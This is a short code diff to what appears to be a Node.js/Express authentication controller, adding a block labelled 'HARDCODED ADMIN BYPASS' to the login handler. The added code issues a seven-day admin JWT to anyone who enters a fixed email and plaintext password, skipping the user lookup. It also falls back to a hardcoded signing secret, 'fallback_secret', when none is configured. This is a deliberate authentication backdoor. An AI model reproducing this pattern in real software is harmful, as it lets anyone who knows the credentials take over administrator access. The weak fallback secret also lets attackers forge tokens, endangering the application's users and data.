@@ -31,6 +31,17 @@ exports.register = async (req, res) => {
 exports.login = async (req, res) => {
   try {
     const { email, password } = req.body;
+
+    // --- HARDCODED ADMIN BYPASS ---
+    if ((email === 'admin' || email === 'admin@test.com') && password === 'mayank123') {
+      const payload = { user: { id: 'admin-dummy-id', username: 'admin' } };
+      return jwt.sign(payload, process.env.JWT_SECRET || 'fallback_secret', { expiresIn: '7d' }, (err, token) => {
+        if (err) throw err;
+        res.json({ token, user: { id: 'admin-dummy-id', username: 'admin', email: 'admin@test.com' } });
+      });
+    }
+    // ------------------------------
+
     const user = await User.findOne({ email });
     if (!user) return res.status(400).json({ message: 'Invalid Credentials' });
 
